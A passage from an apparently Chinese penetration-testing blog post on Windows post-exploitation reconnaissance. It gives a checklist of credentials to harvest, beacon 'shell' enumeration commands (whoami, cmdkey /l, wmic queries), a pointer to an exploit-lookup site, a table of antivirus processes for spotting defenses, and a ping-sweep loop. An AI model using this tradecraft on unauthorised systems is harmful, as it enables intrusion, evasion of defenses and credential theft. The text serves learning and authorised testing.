&lt;/span>&lt;span class="lnt">32
&lt;/span>&lt;span class="lnt">33
&lt;/span>&lt;span class="lnt">34
&lt;/span>&lt;span class="lnt">35
&lt;/span>&lt;span class="lnt">36
&lt;/span>&lt;span class="lnt">37
&lt;/span>&lt;span class="lnt">38
&lt;/span>&lt;span class="lnt">39
&lt;/span>&lt;span class="lnt">40
&lt;/span>&lt;span class="lnt">41
&lt;/span>&lt;span class="lnt">42
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">操作系统
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">当权用户权限
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">内网IP段（网卡信息）
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">杀毒软件（AV）
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">端口开放情况
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">系统补丁
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">网络状态
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">共享文件夹
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">远程信息
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">服务信息
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">软件列表
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">计划任务
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">启动项
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">系统日志
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">防火墙规则
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">网络代理信息
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">内网OA办公系统
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">邮件服务器
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">网络监控系统
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">财务应用系统
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">核心产品源码（SVN/Git 服务器）
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">管理员密码
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">浏览器密码
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">cookie
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">无线密码
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">数据库密码
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">VPN历史密码
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Teamview 历史密码
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">其他用户 session
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">3389 连接记录
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">IPC$ 连接记录
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">各用户回收站信息
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">用户列表
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">host 文件
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">DNS 缓存信息
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">补丁信息
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">端口信息
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">账户密码策略
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">账号锁定策略
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Web 服务器配置文件
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Web 服务器日志
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">......
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h1 id="0x02-windows信息收集">0x02 Windows信息收集&lt;/h1>
&lt;h3 id="1-主机信息收集">1. 主机信息收集&lt;/h3>
&lt;p>查看当前用户以及当前用户所在组，所拥有的权限。&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">shell whoami /all
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250715000825.png" alt="image.png">&lt;/p>
&lt;h3 id="2-网卡和ip信息收集">2. 网卡和IP信息收集&lt;/h3>
&lt;p>查看网卡等基本网络配置信息，主要留意Ethernet0以及Ethernet1，这个网卡，记录了可以通的网段信息&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">shell ipconfig /all
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250715001546.png" alt="image.png">&lt;br>
可以看出当前是两个网卡，并且主DNS是一个域名（这里环境有问题，一般看DNS是一个域名，既是域环境。），一般来说只有域机器才会有域名显示，而在工作组下显示的是空：&lt;/p>
&lt;h3 id="3-查看系统详情信息">3. 查看系统详情信息&lt;/h3>
&lt;p>可以查看网卡，系统，补丁信息&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">shell systeminfo
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250715002249.png" alt="image.png">&lt;br>
我们可以通过该命令获得了系统的信息，就可以直接使用下面网站获取exp。&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">http://bypass.tidesec.com/exp/
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>直接复制粘贴过来即可&lt;br>
&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250715002637.png" alt="image.png">&lt;br>
&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250715002708.png" alt="image.png">&lt;/p>
&lt;h3 id="4-查看操作系统和版本信息">4. 查看操作系统和版本信息&lt;/h3>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">英文版系统用这个命令：
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">shell systeminfo | findstr /B /C:&amp;#34;OS Name&amp;#34; /C:&amp;#34;OS Version&amp;#34;
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">中文版系统用这个命令：
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">shell systeminfo | findstr /B /C:&amp;#34;OS 名称&amp;#34; /C:&amp;#34;OS 版本&amp;#34;
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250715003206.png" alt="image.png">&lt;/p>
&lt;h3 id="5-查看系统体系结构">5. 查看系统体系结构&lt;/h3>
&lt;p>检查系统架构（AMD64或者x86）-&amp;gt;影响后续工具选择&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">shell echo %PROCESSOR_ARCHITECTURE%
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250715003409.png" alt="image.png">&lt;/p>
&lt;h3 id="6-主机路由信息">6. 主机路由信息&lt;/h3>
&lt;p>可以查看网络目标，都是主机可以直接访问到的机器&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">shell route print
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250715003943.png" alt="image.png">&lt;/p>
&lt;h3 id="7-arp缓存信息">7. ARP缓存信息&lt;/h3>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">shell arp -a
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250715004046.png" alt="image.png">&lt;/p>
&lt;h3 id="8-dns缓存信息">8. DNS缓存信息&lt;/h3>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">shell ipconfig /displaydns
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250715004213.png" alt="image.png">&lt;/p>
&lt;h3 id="9-host文件信息">9. Host文件信息&lt;/h3>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">shell type C:\windows\System32\drivers\etc\hosts
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250715004319.png" alt="image.png">&lt;/p>
&lt;h3 id="10-端口连接信息">10. 端口连接信息&lt;/h3>
&lt;p>可以查看当前主机的端口链接情况，一级当前主机与网络中的主机连接建立情况，不仅有公网主机还有内网主机。&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">shell netstat -ano
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250715004540.png" alt="image.png">&lt;/p>
&lt;h3 id="11-会话连接">11. 会话连接&lt;/h3>
&lt;p>可以查看主机与客户机之间的会话连接&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">shell net session
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250715004712.png" alt="image.png">&lt;/p>
&lt;h3 id="12-查看当前保存的登录凭证也能看到通的ip">12. 查看当前保存的登录凭证，也能看到通的ip&lt;/h3>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">shell cmdkey /l
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250715004813.png" alt="image.png">&lt;/p>
&lt;h3 id="13-查看当前主机开启的共享列表">13. 查看当前主机开启的共享列表&lt;/h3>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">shell net share
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250715004915.png" alt="image.png">&lt;/p>
&lt;h3 id="14-远程相关信息">14. 远程相关信息&lt;/h3>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">相关链接：
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">http://bypass.tidesec.com/bycms
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">命令：
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">shell tasklist
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250715005059.png" alt="image.png">&lt;/p>
&lt;h3 id="15-查看当前主机与网络中的其他主机建立的共享链接">15. 查看当前主机与网络中的其他主机建立的共享链接&lt;/h3>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">shell net use
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250715005226.png" alt="image.png">&lt;/p>
&lt;h3 id="16-查看主机进程信息">16. 查看主机进程信息&lt;/h3>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">shell wmic process get Name,ProcessId,ExecutablePath
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>可以查看主机进程信息，并作出过滤进程路径，名称和pid。&lt;br>
&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250715005346.png" alt="image.png">&lt;/p>
&lt;h3 id="17-指定查看路径信息">17. 指定查看路径信息&lt;/h3>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">shell wmic process where Name=&amp;#34;有道云笔记.exe&amp;#34; get ExecutablePath
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250715005611.png" alt="image.png">&lt;/p>
&lt;h3 id="18-查看补丁信息">18. 查看补丁信息&lt;/h3>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">shell wmic qfe get Caption,CSName,Description,HotFixID,InstalledOn
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250715005731.png" alt="image.png">&lt;/p>
&lt;h3 id="19-查看安装应用信息">19. 查看安装应用信息&lt;/h3>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">shell wmic product get Caption,Version
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250715005846.png" alt="image.png">&lt;br>
PS：在win10中，输入&lt;code>wmic /?&lt;/code>会提示wmic已弃用，但在server2012R2,win7等版本可以正常使用&lt;br>
powershell中可代替该命令的是：&lt;code>Get-WinObject&lt;/code>：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">Get-WinObject -class win32_product | Select-object -property name,version
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h3 id="20-查询本机服务">20. 查询本机服务&lt;/h3>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">shell wmic server list brief
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250715010339.png" alt="image.png">&lt;/p>
&lt;h3 id="21-查询目标主机上的杀毒软件">21. 查询目标主机上的杀毒软件&lt;/h3>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">查询进程：shell tasklist，
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">或者：shell wmic process list brief
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250715110942.png" alt="image.png">&lt;br>
常见的杀软进程：&lt;/p>
&lt;table>
&lt;thead>
&lt;tr>
&lt;th>进程名&lt;/th>
&lt;th>软件&lt;/th>
&lt;/tr>
&lt;/thead>
&lt;tbody>
&lt;tr>
&lt;td>360sd.exe&lt;/td>
&lt;td>360杀毒&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>360tray.exe&lt;/td>
&lt;td>360实时保护&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>ZhuDongFangYu.exe&lt;/td>
&lt;td>360主动防御&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>KSafeTray.exe&lt;/td>
&lt;td>金山卫士&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>SafeDogUpdateCenter.exe&lt;/td>
&lt;td>安全狗&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>McAfee McShield.exe&lt;/td>
&lt;td>McAfee&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>egui.exe&lt;/td>
&lt;td>NOD32&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>AVP.exe&lt;/td>
&lt;td>卡巴斯基&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>avhuard.exe&lt;/td>
&lt;td>小红伞&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>bdagent.exe&lt;/td>
&lt;td>BitDefender&lt;/td>
&lt;/tr>
&lt;/tbody>
&lt;/table>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">shell wmic /node:localhost /namespace:\\root\SecurityCenter2 path AntiVirusProduct Get DisplayName | findstr /V /B /C:displayName || echo No Antivirus installed
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250715112024.png" alt="image.png">&lt;br>
主动防御软件的安装路径&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">shell wmic /namespace:\\root\SecurityCenter2 path antiVirusProduct Get displayName,productstate,pathtosignedproductexe
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h3 id="22-查看已启动的程序信息">22. 查看已启动的程序信息&lt;/h3>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">shell wmic startup get command,caption
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250715112539.png" alt="image.png">&lt;/p>
&lt;h3 id="23-查看计划任务">23. 查看计划任务&lt;/h3>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">shell schtasks /query /fo LISR /v
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h3 id="24-查看主机的开机时间">24. 查看主机的开机时间&lt;/h3>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">shell net statistics workstation
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250715112823.png" alt="image.png">&lt;/p>
&lt;h1 id="0x04-探测网段存活">0x04 探测网段存活&lt;/h1>
&lt;p>高速内网扫描&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">shell for /l %i in (1,1,255) do @ping -n 1 -w 30 192.168.12.%i | find /i &amp;#34;ttl= &amp;#34;
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>随机延迟+长超时&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
